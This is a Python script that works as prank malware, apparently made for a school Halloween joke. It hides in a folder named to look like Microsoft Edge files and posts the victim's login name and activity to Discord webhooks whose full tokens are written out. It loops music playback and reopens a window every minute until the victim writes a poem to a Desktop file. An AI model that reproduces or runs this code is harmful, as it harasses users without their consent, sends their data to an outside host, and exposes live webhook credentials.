import os, requests, time, threading, sys
from multiprocessing import Process

timestamp = time.time()
home_dir = os.path.expanduser("~")
appdata = os.environ['APPDATA']
shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
virus_dir = os.path.join(
    home_dir,
    ".temp",
    "Microsoft_Edge_x64",
    "utils"
)

def log_to_discord(msg:str, important=False):
    data = {"username":f"User:{os.getlogin()}", "content":msg}
    try:
        requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
        if important:
            requests.post("https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT", json = data)
    except:
        print("Failed to send port request")
log_to_discord("Annoying file...")
        
def open_window(delay = 0):
    
    global timestamp
    time.sleep(delay)
    log_to_discord(f"Opening window... (part1)")
    log_to_discord(f"Opening window...\n{time.time() - timestamp}s from start. (part2)")
    import tkinter as tk
    def create_and_run_window():
        root = tk.Tk()
        root.title("GAMA Halloween")
        canvas = tk.Canvas(root, width=800,height=600,bg="skyblue")
        canvas.pack()
        points = [(250, 150), (300, 500), (500, 200)]
        canvas.create_rectangle(points[0], points[1], fill='red', outline="red")
        canvas.create_rectangle(points[2], points[0], fill='red', outline="red")
        canvas.create_text(400, 550, text="Ak sa chcete zbaviť tohto okna, napíšte nám básničku do súboru v Desktop/vzdavam_sa.txt (aspoň jedna strofa).", fill="green")
        root.protocol("WM_DELETE_WINDOW", lambda: root.destroy()) # Allow proper closure
        root.mainloop()
        # After the window is closed, schedule a new one to open after delay
        threading.Timer(60, open_window).start()
    create_and_run_window()

# def start():
chnapik_duration = 2*60+10

def music_loop():
    log_to_discord("Starting music loop...")
    while True:
        log_to_discord("Playing music...")
        os.system(f'start /wait "" "{os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3")}"')
        # time.sleep(chnapik_duration)
        time.sleep(60) # 1 min delay

music_process = threading.Thread(target=music_loop, daemon=True, name="GAMA1")
music_process.start()

# Run the annoying window in a separate thread
window_thread = threading.Thread(target=open_window, daemon=True, name="GAMA2")
window_thread.start()
while True: 
    # log_to_discord("Checking in gama_aaa.py...")
    try:
        with open(os.path.join(home_dir, "Desktop", "vzdavam_sa.txt")) as f:
            content = f.readlines()
            if len(content) > 3:
                sys.exit(0)
    except FileExistsError:
        pass
    except Exception as e:
        log_to_discord("Error in gama_aaa.py's resign detection: {e}")
    time.sleep(20) # Keep the main script alive for daemon threads


# start()
